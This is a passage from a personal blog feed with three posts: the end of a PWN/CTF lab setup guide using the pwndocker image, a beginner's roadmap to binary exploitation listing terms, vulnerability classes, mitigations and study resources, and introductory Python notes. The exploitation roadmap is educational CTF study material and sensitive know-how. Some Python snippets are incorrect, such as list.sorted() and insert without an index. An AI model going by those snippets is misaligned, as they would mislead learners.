class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymao <span class="keyword">import</span> *</span><br><span class="line">libc = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">main_arena_offset = gmao(blic)</span><br><span class="line">main_arena_offset</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018190005207-275353742.png" alt="image-20211018190004252"> </p><h3 id="seccomp-tools（用来读取seccomp沙箱规则）"><a href="#seccomp-tools（用来读取seccomp沙箱规则）" class="headerlink" title="seccomp-tools（用来读取seccomp沙箱规则）"></a>seccomp-tools（用来读取seccomp沙箱规则）</h3><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018190239162-1171225452.png" alt="image-20211018190238328"> </p><h2 id="docker版pwn环境"><a href="#docker版pwn环境" class="headerlink" title="docker版pwn环境"></a>docker版pwn环境</h2><p>如果怕麻烦的话可以直接用大神们打包好的docker版的pwn环境，<a href="https://hub.docker.com/r/skysider/pwndocker">skysider/pwndocker</a>。</p><p>命令行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">    --rm \</span><br><span class="line">    -h <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">    --name <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">    -v $(<span class="built_in">pwd</span>)/<span class="variable">$&#123;ctf_name&#125;</span>:/ctf/work \</span><br><span class="line">    -p 23946:23946 \</span><br><span class="line">    --cap-add=SYS_PTRACE \</span><br><span class="line">    skysider/pwndocker</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;ctf_name&#125;</span> /bin/bash</span><br></pre></td></tr></table></figure><p>具体使用方法如下：</p><p>打开你的终端，然后比如你今天要打buuctf，那么在终端输入ctf_name=buuctf，然后再输入上面的命令行，并且此时你终端当前目录会多出一个buuctf的目录，你可以把pwn文件放进去这样就能同步到docker里面。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018191544765-74106917.png" alt="image-20211018191543633"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018192054698-765872729.png" alt="image-20211018192053683"> </p><p>最后欢迎各位大佬加群学习交流PWN技术、或者re</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018120041866-1978110731.png" alt="avatar"> </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;本教程主要参考&lt;a href=&quot;https://www.yuque.com/hxfqg9/bin/hg3qeh&quot;&gt;PWN虚拟机配置&lt;/a&gt;、&lt;a href=&quot;https://www</summary>
      
    
    
    
    <category term="二进制安全" scheme="https://vxer-lee.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="PWN学习" scheme="https://vxer-lee.github.io/tags/PWN%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>PWN二进制漏洞学习指南</title>
    <link href="https://vxer-lee.github.io/2021/10/16/PWN/PWN_Getting_Started_Guide/"/>
    <id>https://vxer-lee.github.io/2021/10/16/PWN/PWN_Getting_Started_Guide/</id>
    <published>2021-10-16T03:17:11.000Z</published>
    <updated>2021-10-19T01:58:40.408Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近准备学PWN，所以买了<a href="http://product.dangdang.com/29166115.html">《CTF权威指南(PWN)篇》</a>的书粗略的看完后，在这里做个学PWN需要掌握的知识指南，如有补充欢迎评论。</p><h2 id="前置技能"><a href="#前置技能" class="headerlink" title="前置技能"></a>前置技能</h2><p>首先我觉得要学习PWN还是要有一定基础的，因为PWN毕竟是和系统底层知识打交道，所以我觉得应该具备如下的一些技能，并且我推荐了一些不错的书籍。</p><ul><li>Linux系统基础知识<a href="https://tiramisutes.github.io/images/PDF/vbird-linux-basic-4e.pdf">《鸟哥Linux私房菜》</a>、<a href="https://www.linuxprobe.com/book">《Linux就该这么学》</a>、<a href="https://www.linuxcool.com/">《Linux命令大全》</a></li><li>Linux下C语言编程 <a href="http://staff.ustc.edu.cn/~guoyan/os12/LinuxC.pdf">《Linux C编程一站式学习》</a></li><li>Python编程基础知识 <a href="https://www.lanzoui.com/i508dab">《Python编程：从入门到实践》</a></li><li>汇编语言<a href="https://ihpm.cn/2318/.html">《汇编语言(第4版)》</a>、 <a href="https://www.cnblogs.com/VxerLee/p/15055485.html">王爽8086汇编学习笔记</a></li><li>熟悉ELF文件格式 <a href="https://www.xknote.com/books/nc6mb8.html#download">《Linux二进制分析 》</a></li><li>熟悉GDB动态调试 <a href="https://hack-big.tech/2019/01/30/gdb%E8%B0%83%E8%AF%95%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">gdb调试常用指令</a></li></ul><h2 id="PWN概念"><a href="#PWN概念" class="headerlink" title="PWN概念"></a>PWN概念</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>PWN我觉得最开始的时候应该是没有这门学科和系统化的资料教程的，PWN本身属于高阶技能，个人感觉都是以前那些逆向大佬、编程大佬开始玩点高级的东西，然后就开始挖漏洞，结果就挖出了各种二进制漏洞，并且把二进制漏洞也完美的利用起来了，后面就归纳总结出一套体系供后人学习，在此真的膜拜那些前辈的共享精神。<br><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211019095824094-1920139642.png" alt="看门狗》对主角团的演变，也是黑客的形象变迁简史_腾讯新闻">   </p><h3 id="发音"><a href="#发音" class="headerlink" title="发音"></a>发音</h3><p>至于PWN为什么叫PWN呢？是什么单词的缩写吗？其实只是一种声音，pwn!你的电脑爆炸了，你的电脑被攻破了，因为用二进制漏洞挖掘与利用这词来形容pwn未免也太长了，所以就用了简洁的叫法。</p><h3 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h3><p>这里介绍一些简单的PWN术语</p><ul><li>Exploit(exp)  用于攻击的脚本与方案</li><li>Payload 攻击载荷，是对目标进程劫持控制流的数据</li><li>Shellcode 调用攻击目标的shell的代码</li></ul><h2 id="PWN环境搭建"><a href="#PWN环境搭建" class="headerlink" title="PWN环境搭建"></a>PWN环境搭建</h2><p>学习PWN知识我们先需要一个指定的环境来进行PWN，这里首选的操作系统为Ubuntu、Kali然后安装必要的PWN环境软件来进行搭建，当然如果你想省力气的话也可以用docker直接部署别人封装好的pwn环境。</p><p>推荐教程链接：<a href="https://www.yuque.com/hxfqg9/bin/hg3qeh">PWN虚拟机配置-yichen知识库</a>、<a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=1">PWN环境配置-星盟安全</a>、<a href="https://zhuanlan.zhihu.com/p/71914632">PWN入门教程-环境配置</a>、<a href="https://hub.docker.com/r/skysider/pwndocker">pwndocker</a></p><h2 id="PWN知识学习途径"><a href="#PWN知识学习途径" class="headerlink" title="PWN知识学习途径"></a>PWN知识学习途径</h2><p>个人觉得PWN知识的话需要掌握<code>常见漏洞</code>、<code>安全机制</code>、<code>PWN技巧</code>。</p><h3 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h3><ul><li>整数安全</li><li>格式化字符串</li><li>栈溢出与ROP</li><li>堆利用</li></ul><h3 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h3><ul><li>Stack Canaries 栈保护</li><li>No-eXecute</li><li>ALSR 和 PIE</li><li>FORTIFY_SOURCE</li><li>RELRO</li></ul><h3 id="PWN技巧"><a href="#PWN技巧" class="headerlink" title="PWN技巧"></a>PWN技巧</h3><ul><li>One-gadget</li><li>通用dadget及Return-to-csu</li><li>劫持hook函数</li><li>利用DynELF泄露函数地址</li><li>SSP Leak</li><li>利用environ泄露栈地址</li><li>利用_IO_FILE结构</li><li>利用vsyscall</li></ul><p>推荐的学习资料有<a href="https://weread.qq.com/web/reader/8c632950722265af8c62923">《CTF竞赛权威指南（PWN篇）》</a>、<a href="https://www.bilibili.com/video/BV1Uv411j7fr?from=search&seid=12666855031097058738&spm_id_from=333.337.0.0">星盟安全 PWN系列教程</a>、<a href="https://zhuanlan.zhihu.com/p/75268518">Linux Pwn入门教程</a>、<a href="https://www.yuque.com/hxfqg9/bin">yichen的信安知识库 二进制安全</a>、<a href="https://www.bilibili.com/read/cv11002853">CTF中PWN知识点整理</a>、<a href="https://mp.weixin.qq.com/s/LmjSpb6HyiYyooZL1WIPZg">CTF-PWN资料与资源</a>、<a href="https://guyinatuxedo.github.io/00-intro/index.html">Nightmare 二进制课程</a>。然后最好是跟着视频或者书籍再找一个在线的CTF网站练习，因为只有练习多了后才能熟能生巧，才能加深各种知识的理解。</p><p>推荐的CTF平台有：<a href="https://buuoj.cn/">BUUCTF</a>、<a href="https://pwnable.tw/challenge/">pwnable.tw</a>、<a href="https://adworld.xctf.org.cn/">攻防世界</a>、<a href="https://www.ctfer.vip/#/index">NSSCTF</a>、<a href="http://pwnable.kr/">pwnable.kr</a></p><h2 id="PWN相关资源博客"><a href="#PWN相关资源博客" class="headerlink" title="PWN相关资源博客"></a>PWN相关资源博客</h2><p>这些是我随便收集的排名不分先后，方便知识获取与整理。</p><p><a href="https://bestwing.me/">https://bestwing.me/</a> Swing’Blog 浮生若梦</p><p><a href="https://www.jarvisw.com/">https://www.jarvisw.com/</a> 人称汪神 白帽子、全栈、IoT安全专家、嵌入式系统专家</p><p><a href="http://whereisk0shl.top/">http://whereisk0shl.top/</a> K0sh1: 就职于 360 vulcan Team ，擅长windows 漏洞挖掘与利用</p><p><a href="https://o0xmuhe.github.io/">https://o0xmuhe.github.io/</a> 三叶草Pwn选手，多个Adobe CVE编号拥有者</p><p><a href="https://changochen.github.io/about.html">https://changochen.github.io/about.html</a> Pwn神，目前在美国求学，专研学术</p><p><a href="https://www.cnblogs.com/Ox9A82/">https://www.cnblogs.com/Ox9A82/</a> 三叶草Pwn选手，玄武实验室就职，方向是Windows和浏览器</p><p><a href="https://f1r.github.io/">https://f1r.github.io/</a> r2kapig 成员，二进制选手</p><p><a href="https://gloxec.github.io/">https://gloxec.github.io/</a> Hook iOS &amp;&amp; Pwn选手，目前就职360</p><p><a href="http://riusksk.me/">http://riusksk.me/</a> 泉哥，《漏洞战争》作者</p><p><a href="https://firmianay.github.io/">https://firmianay.github.io/</a> Firmy Yang 《CTF权威指南(Pwn)篇》作者</p><p><a href="https://roderickchan.github.io/">https://roderickchan.github.io/</a> 群里某位二进制大佬博客</p><p><a href="http://47.101.67.103/tags/pwn/">http://47.101.67.103/tags/pwn/</a> eeeeeeeeeeeeeeeea</p><p><a href="https://zhouyetao.github.io/">https://zhouyetao.github.io</a> 星盟团队创始人之一</p><p><a href="https://eur1ka.github.io/">https://eur1ka.github.io/</a> eur1ka ，群内Pwn大佬 已刷几百pwn题，目前研究IoT</p><p><a href="https://vxer-lee.github.io/">https://vxer-lee.github.io/</a> 我，一个渣渣会点re，正在学pwn</p><h2 id="Pwn菜鸡小分队"><a href="#Pwn菜鸡小分队" class="headerlink" title="Pwn菜鸡小分队"></a>Pwn菜鸡小分队</h2><p>可以加群一起学习pwn技术，群内有pwn大佬(不是我)，互相交流才能进步，群内也可分享re和web技术。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211018120041866-1978110731.png" alt="avatar">  </p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近准备学PWN，所以买了&lt;a href=&quot;h</summary>
      
    
    
    
    <category term="二进制安全" scheme="https://vxer-lee.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="PWN学习" scheme="https://vxer-lee.github.io/tags/PWN%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Python入门学习总结</title>
    <link href="https://vxer-lee.github.io/2021/10/15/Coding/Python/Python_Learning_Summry/"/>
    <id>https://vxer-lee.github.io/2021/10/15/Coding/Python/Python_Learning_Summry/</id>
    <published>2021-10-15T14:39:33.000Z</published>
    <updated>2021-10-15T15:01:59.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>由于有其他高级语言的开发经验，所以入门学起来就快很多，不用像初学那样详细的看，我根据《Python编程：从入门到实践（第2版）》做个简单笔记总结。</strong></p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>安装就不记录了，傻瓜式的下载Python安装包，然后运行python来确定是否已经添加到环境变量、安装完毕，当然还要安装pip.</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211013133110204-235631227.png" alt="image-20211013133110000"> </p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello,World"></a>Hello,World</h3><p>先来写个简单的Hello，World看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;Hello,World!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(msg)</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211013133445315-2082110082.png" alt="image-20211013133445561"> </p><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>和其他高级语言意思一样，Python推荐命名规范用下划线划分单词，比如<code>greeting_message</code>，有空格会引发错误比如<code>greeting message</code>.</p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>在编程中最常用的应该就是字符串相关的处理了。</p><p>Python中推荐字符串用””来包括单引号，用’来包括双引号,比如:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;The language `Python` is named after Monty Python,not the snake.&quot;</span></span><br><span class="line"><span class="string">&#x27;I told my friend,&quot;Python is my favorite language!&quot;&#x27;</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line"><span class="comment">### 首字母大写</span></span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">name = <span class="string">&quot;ada lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.title())</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">Ada Lovelace</span><br></pre></td></tr></table></figure><h3 id="全部小写"><a href="#全部小写" class="headerlink" title="全部小写"></a>全部小写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Ada Lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.lower())</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">ada lovelace</span><br></pre></td></tr></table></figure><h3 id="全部大写"><a href="#全部大写" class="headerlink" title="全部大写"></a>全部大写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;Ada Lovelace&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name.upper())</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">ADA LOVELACE</span><br></pre></td></tr></table></figure><h3 id="Tab和换行符"><a href="#Tab和换行符" class="headerlink" title="Tab和换行符"></a>Tab和换行符</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hello=<span class="string">&quot;\thello,world!\r\n&quot;</span></span><br><span class="line"><span class="built_in">print</span>(hello)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">        hello,world!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">first_name = <span class="string">&quot;ada&quot;</span></span><br><span class="line">last_name = <span class="string">&quot;lovelace&quot;</span></span><br><span class="line">full_name = <span class="string">f&quot;<span class="subst">&#123;first_name&#125;</span> <span class="subst">&#123;last_name&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(full_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#也可以用format</span></span><br><span class="line">first_name = <span class="string">&quot;ada&quot;</span></span><br><span class="line">last_name  = <span class="string">&quot;lovelace&quot;</span></span><br><span class="line">full_name  = <span class="string">&quot;&#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(first_name,last_name)</span><br><span class="line"><span class="built_in">print</span>(full_name)</span><br></pre></td></tr></table></figure><h3 id="去除空格"><a href="#去除空格" class="headerlink" title="去除空格"></a>去除空格</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#删除左边空格</span></span><br><span class="line">s = <span class="string">&#x27;   hello,world   &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s.lstrip())</span><br><span class="line"><span class="comment">#删除右边空格</span></span><br><span class="line"><span class="built_in">print</span>(s.rstrip())</span><br><span class="line"><span class="comment">#删除两端的空格</span></span><br><span class="line"><span class="built_in">print</span>(s.strip())</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;hello,world   &#x27;</span> </span><br><span class="line"><span class="string">&#x27;   hello,world&#x27;</span></span><br><span class="line"><span class="string">&#x27;hello,world&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="List列表"><a href="#List列表" class="headerlink" title="List列表"></a>List列表</h2><p>列表由一系列按特定顺序排列的元素组成。你可以创建包含字母表中所有字母、数字0～9或所有家庭成员姓名的列表；也可以将任何东西加入列表中，其中的元素之间可以没有任何关系。</p><h3 id="列表增删改查排序"><a href="#列表增删改查排序" class="headerlink" title="列表增删改查排序"></a>列表增删改查排序</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>.append(<span class="string">&#x27;添加某元素&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span>.insert(<span class="string">&#x27;插入某元素&#x27;</span>)</span><br><span class="line"><span class="keyword">del</span> <span class="built_in">list</span>[<span class="number">0</span>] <span class="comment">#删除元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>[<span class="number">0</span>]) <span class="comment">#打印元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>.pop(<span class="number">0</span>)) <span class="comment">#打印弹出的值</span></span><br><span class="line"><span class="built_in">list</span>.remove(<span class="string">&#x27;删除某值元素&#x27;</span>)</span><br><span class="line"><span class="built_in">list</span>.sort()<span class="comment">#进行字母排序</span></span><br><span class="line"><span class="built_in">list</span>.<span class="built_in">sorted</span>()<span class="comment">#进行临时排序</span></span><br><span class="line"><span class="built_in">list</span>.reverse()<span class="comment">#倒序</span></span><br></pre></td></tr></table></figure><h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mobiles = [<span class="string">&#x27;小米&#x27;</span>,<span class="string">&#x27;华为&#x27;</span>,<span class="string">&#x27;Oppo&#x27;</span>,<span class="string">&#x27;iPhone&#x27;</span>,<span class="string">&#x27;Vivo&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(mobiles[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">for</span> mobile <span class="keyword">in</span> mobiles:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;mobile&#125;</span>,&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#还可以用range 创建数值列表</span></span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line"><span class="built_in">print</span>(value)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#对数值列表进行统计计算</span></span><br><span class="line">digits=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="built_in">min</span>(digits)</span><br><span class="line"><span class="built_in">max</span>(digits)</span><br><span class="line"><span class="built_in">sum</span>(digits)</span><br></pre></td></tr></table></figure><h2 id="Slice切片"><a href="#Slice切片" class="headerlink" title="Slice切片"></a>Slice切片</h2><p>处理列表的部分元素，Python称之为切片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mobiles = [<span class="string">&#x27;小米&#x27;</span>,<span class="string">&#x27;华为&#x27;</span>,<span class="string">&#x27;Oppo&#x27;</span>,<span class="string">&#x27;iPhone&#x27;</span>,<span class="string">&#x27;Vivo&#x27;</span>]</span><br><span class="line"><span class="comment">#切片练习</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;输出前3个元素:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mobiles[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;索引位置从1开始,到索引4位置结束&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mobiles[<span class="number">1</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;从列表头开始，到索引4位置结束&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mobiles[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;索引位置从2开始，到列表尾&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mobiles[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;负数索引，从末尾开始&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(mobiles[-<span class="number">3</span>:])</span><br></pre></td></tr></table></figure><p><img src="https://img2020.cnblogs.com/blog/2080041/202110/2080041-20211014182530946-1634873328.png" alt="image-20211014182523510"> </p><h3 id="遍历切片"><a href="#遍历切片" class="headerlink" title="遍历切片"></a>遍历切片</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mobiles = [<span class="string">&#x27;小米&#x27;</span>,<span class="string">&#x27;华为&#x27;</span>,<span class="string">&#x27;Oppo&#x27;</span>,<span class="string">&#x27;iPhone&#x27;</span>,<span class="string">&#x27;Vivo&#x27;</span>]</span><br><span class="line"><span class="comment">#遍历切片</span></span><br><span class="line"><span class="keyword">for</span> mobile <span class="keyword">in</span> mobiles[:<span class="number">3</span>]: <span class="comment">#遍历3个元素</span></span><br><span class="line">    <span class="built_in">print</span>(mobile)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> re_mobile <span class="keyword">in</span> mobiles[-<span class="number">3</span>:]: <span class="comment">#遍历倒数3个元素</span></span><br><span class="line">    <span class="built_in">print</span>(re_mobile)</span><br></pre></td></tr></table></figure><h3 id="复制列表"><a href="#复制列表" class="headerlink" title="复制列表"></a>复制列表</h3><p>我们经常需要根据既有列表创建全新的列表。下面来介绍复制列表的工作原理，以及复制列表可提供极大帮助的一种情形。</p><p>要复制列表，可创建一个包含整个列表的切片，方法是同时省略起始索引和终止索引（[:]）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">my_foods = [<span class="string">&#x27;pizza&#x27;</span>,<span class="string">&#x27;falafel&#x27;</span>,<span class="string">&#x27;carrot cake&#x27;</span>]</span><br><span class="line">friend_foods = my_foods[:] <span class="comment">#复制了一份我的食物</span></span><br><span class="line">friend_foods.append(<span class="string">&#x27;ice cream&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(my_foods)</span><br><span class="line"><span class="built_in">print</span>(friend_foods)</span><br></pre></td></tr></table></figure><h2 id="Tup元组"><a href="#Tup元组" class="headerlink" title="Tup元组"></a>Tup元组</h2><p>元组看起来很像列表，但使用<code>圆括号</code>而非中括号来标识。定义元组后，就可使用索引来访问其元素，就像访问列表元素一样。</p><p>例如，如果有一个大小不应改变的矩形，可将其长度和宽度存储在一个元组中，从而确保它们是不能修改的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dimensions=(<span class="number">200</span>,<span class="number">50</span>,<span class="number">1</span>,<span class="number">23</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(dimensions[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#遍历元组数据</span></span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br></pre></td></tr></table></figure><h3 id="修改元组变量"><a href="#修改元组变量" class="headerlink" title="修改元组变量"></a>修改元组变量</h3><p>虽然不能修改元组的元素，但可以给存储元组的变量赋值。因此，如果要修改前述矩形的尺寸，可重新定义整个元组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dimensions = (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改</span></span><br><span class="line">dimensions = (<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> dimension <span class="keyword">in</span> dimensions:</span><br><span class="line">    <span class="built_in">print</span>(dimension)</span><br></pre></td></tr></table></figure><h2 id="Dictionary字典"><a href="#Dictionary字典" class="headerlink" title="Dictionary字典"></a>Dictionary字典</h2><p>在Python中，字典是<code>一系列键值对</code>。每个<code>键</code>都与一个<code>值</code>相关联，你可使用键来访问相关联的值。与键相关联的值可以是数、字符串、列表乃至字典。事实上，可将任何Python对象用作字典中的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 